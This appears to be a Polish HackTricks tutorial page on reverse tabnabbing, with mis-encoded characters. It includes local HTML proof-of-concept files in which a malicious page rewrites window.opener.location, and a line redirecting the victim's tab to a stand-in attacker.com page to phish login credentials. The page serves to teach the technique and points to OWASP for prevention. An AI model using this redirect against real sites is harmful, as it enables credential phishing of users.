<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


# Opis

W sytuacji, gdy **atakujÄ…cy** moÅ¼e **kontrolowaÄ‡** argument **`href`** znacznika **`<a`** z atrybutem **`target="_blank" rel="opener"`**, ktÃ³ry zostanie klikniÄ™ty przez ofiarÄ™, **atakujÄ…cy** moÅ¼e **skierowaÄ‡** ten **link** do strony internetowej pod swojÄ… kontrolÄ… (zÅ‚oÅ›liwa strona internetowa). NastÄ™pnie, gdy **ofiara kliknie** link i wejdzie na stronÄ™ atakujÄ…cego, ta **zÅ‚oÅ›liwa strona internetowa** bÄ™dzie mogÅ‚a **kontrolowaÄ‡** **oryginalnÄ… stronÄ™** za pomocÄ… obiektu JavaScript **`window.opener`**.\
JeÅ›li strona nie ma **`rel="opener"`**, ale zawiera `target="_blank"`, to rÃ³wnieÅ¼ moÅ¼e byÄ‡ podatna.

ZwykÅ‚ym sposobem wykorzystania tego zachowania byÅ‚oby **zmienienie lokalizacji oryginalnej strony internetowej** za pomocÄ… `window.opener.location = https://attacker.com/victim.html` na stronÄ™ kontrolowanÄ… przez atakujÄ…cego, ktÃ³ra **wyglÄ…da jak oryginalna**, dziÄ™ki czemu moÅ¼e **naÅ›ladowaÄ‡** **formularz logowania** oryginalnej strony internetowej i prosiÄ‡ uÅ¼ytkownika o dane uwierzytelniajÄ…ce.

NaleÅ¼y jednak zauwaÅ¼yÄ‡, Å¼e poniewaÅ¼ **atakujÄ…cy teraz moÅ¼e kontrolowaÄ‡ obiekt okna oryginalnej strony internetowej**, moÅ¼e go naduÅ¼ywaÄ‡ w inny sposÃ³b, aby przeprowadzaÄ‡ **bardziej skryte ataki** (moÅ¼e modyfikowaÄ‡ zdarzenia JavaScript, aby wyciekaÄ‡ informacje do serwera kontrolowanego przez niego?).

# PrzeglÄ…d

## Z odnoÅ›nikiem wstecznym

PoÅ‚Ä…czenie miÄ™dzy stronami nadrzÄ™dnymi i podrzÄ™dnymi, gdy nie jest uÅ¼ywany atrybut zapobiegajÄ…cy:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITH_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITH\_LINK.png)

## Bez odnoÅ›nika wstecznego

PoÅ‚Ä…czenie miÄ™dzy stronami nadrzÄ™dnymi i podrzÄ™dnymi, gdy jest uÅ¼ywany atrybut zapobiegajÄ…cy:

![https://owasp.org/www-community/assets/images/TABNABBING_OVERVIEW_WITHOUT_LINK.png](https://owasp.org/www-community/assets/images/TABNABBING\_OVERVIEW\_WITHOUT\_LINK.png)

## PrzykÅ‚ady <a href="#examples" id="examples"></a>

UtwÃ³rz nastÄ™pujÄ…ce strony w folderze i uruchom serwer WWW za pomocÄ… `python3 -m http.server`\
NastÄ™pnie **wejdÅº** na `http://127.0.0.1:8000/`vulnerable.html, **kliknij** na link i zauwaÅ¼, jak **zmienia siÄ™** **URL** **oryginalnej** **strony internetowej**.

{% code title="vulnerable.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>Victim Site</h1>
<a href="http://127.0.0.1:8000/malicious.html" target="_blank" rel="opener">Controlled by the attacker</a>
</body>
</html>
```
{% code title="zÅ‚oÅ›liwy.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<script>
window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
</script>
</body>
</html>
```
{% code title="malicious_redir.html" %}
```markup
<!DOCTYPE html>
<html>
<body>
<h1>New Malicious Site</h1>
</body>
</html>
```
{% endcode %}

## DostÄ™pne wÅ‚aÅ›ciwoÅ›ci <a href="#accessible-properties" id="accessible-properties"></a>

W przypadku wystÄ…pienia **dostÄ™pu miÄ™dzy domenami** (dostÄ™pu miÄ™dzy rÃ³Å¼nymi domenami), wÅ‚aÅ›ciwoÅ›ci instancji klasy JavaScript **window**, na ktÃ³re moÅ¼na uzyskaÄ‡ dostÄ™p przez zÅ‚oÅ›liwÄ… witrynÄ™ przy uÅ¼yciu odwoÅ‚ania do obiektu JavaScript **opener**, sÄ… ograniczone do nastÄ™pujÄ…cych:

- **`opener.closed`**: Ta wÅ‚aÅ›ciwoÅ›Ä‡ jest uÅ¼ywana do sprawdzenia, czy okno zostaÅ‚o zamkniÄ™te, zwracajÄ…c wartoÅ›Ä‡ logicznÄ….
- **`opener.frames`**: Ta wÅ‚aÅ›ciwoÅ›Ä‡ umoÅ¼liwia dostÄ™p do wszystkich elementÃ³w iframe w bieÅ¼Ä…cym oknie.
- **`opener.length`**: Ta wÅ‚aÅ›ciwoÅ›Ä‡ zwraca liczbÄ™ elementÃ³w iframe obecnych w bieÅ¼Ä…cym oknie.
- **`opener.opener`**: OdwoÅ‚anie do okna, ktÃ³re otworzyÅ‚o bieÅ¼Ä…ce okno, moÅ¼na uzyskaÄ‡ za pomocÄ… tej wÅ‚aÅ›ciwoÅ›ci.
- **`opener.parent`**: Ta wÅ‚aÅ›ciwoÅ›Ä‡ zwraca okno nadrzÄ™dne bieÅ¼Ä…cego okna.
- **`opener.self`**: Ta wÅ‚aÅ›ciwoÅ›Ä‡ umoÅ¼liwia dostÄ™p do samego bieÅ¼Ä…cego okna.
- **`opener.top`**: Ta wÅ‚aÅ›ciwoÅ›Ä‡ zwraca najwyÅ¼sze okno przeglÄ…darki.

Jednak w przypadku, gdy domeny sÄ… identyczne, zÅ‚oÅ›liwa witryna uzyskuje dostÄ™p do wszystkich wÅ‚aÅ›ciwoÅ›ci udostÄ™pnianych przez [**window**](https://developer.mozilla.org/en-US/docs/Web/API/Window) odwoÅ‚anie do obiektu JavaScript.

# Zapobieganie

Informacje dotyczÄ…ce zapobiegania sÄ… udokumentowane w [HTML5 Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5\_Security\_Cheat\_Sheet.html#tabnabbing).

## OdwoÅ‚ania

* [https://owasp.org/www-community/attacks/Reverse_Tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)




<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
